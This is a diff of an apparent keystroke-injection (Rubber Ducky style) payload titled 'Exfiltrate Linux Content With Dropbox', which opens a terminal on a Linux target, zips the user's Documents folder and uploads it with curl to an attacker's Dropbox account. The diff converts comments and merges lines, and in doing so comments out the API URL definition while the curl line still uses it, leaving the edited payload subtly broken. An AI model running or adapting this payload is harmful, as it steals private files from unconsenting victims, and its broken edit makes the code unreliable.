@@ -1,28 +1,25 @@
-REM ##########################################################
-REM #                                                        |
-REM # Title        : Exfiltrate Linux Content With Dropbox   |
-REM # Author       : Aleff                                   |
-REM # Version      : 1.0                                     |
-REM # Category     : Exfiltration                            |
-REM # Target       : Linux                                   |
-REM #                                                        |
-REM ##########################################################
+* ##########################################################
+* #                                                        |
+* # Title        : Exfiltrate Linux Content With Dropbox   |
+* # Author       : Aleff                                   |
+* # Version      : 1.0                                     |
+* # Category     : Exfiltration                            |
+* # Target       : Linux                                   |
+* #                                                        |
+* ##########################################################
 
-REM Requirements:
-REM     - Internet Connection
-REM     - Dropbox Account
-REM     - - DROPBOX_ACCESS_TOKEN
+* Requirements:
+*     - Internet Connection
+*     - Dropbox Account
+*     - - DROPBOX_ACCESS_TOKEN
 
 
 DELAY 1000
 CTRL-ALT t
 
 DELAY 2000
-REM Required: Set here your Dropbox access TOKEN
-DEFINE TOKEN example
-STRING ACCESS_TOKEN="
-STRING TOKEN
-STRING "
+* Required: Set here your Dropbox access TOKEN
+STRING ACCESS_TOKEN="TOKEN"
 ENTER
 
 DELAY 500
@@ -46,11 +43,11 @@ STRING ZIP_PATH="$path/$NAME"
 ENTER
 
 DELAY 500
-REM The FOLDER that you want to zip, in this example you want to zip all Documents content
+* The FOLDER that you want to zip, in this example you want to zip all Documents content
 STRING FOLDER="/home/$USER_NAME/Documents/"
 ENTER
 
-REM Delay for zipping operation, it depends by computer power and folder directory
+* Delay for zipping operation, it depends by computer power and folder directory
 DELAY 10000
 
 DELAY 500
@@ -71,10 +68,8 @@ ENTER
 
 
 DELAY 500
-DEFINE DROPBOX_API_CONST https://content.dropboxapi.com/2/files/upload
-STRING curl -X POST
-STRING DROPBOX_API_CONST
-STRING --header "Authorization: Bearer $ACCESS_TOKEN" --header "Dropbox-API-Arg: {\"path\": \"$DROPBOX_FOLDER\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" --header "Content-Type: application/octet-stream" --data-binary "@$ZIP_PATH"
+* DEFINE DROPBOX_API_CONST https://content.dropboxapi.com/2/files/upload
+STRING curl -X POST DROPBOX_API_CONST --header "Authorization: Bearer $ACCESS_TOKEN" --header "Dropbox-API-Arg: {\"path\": \"$DROPBOX_FOLDER\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" --header "Content-Type: application/octet-stream" --data-binary "@$ZIP_PATH"
 ENTER
 
 DELAY 2000
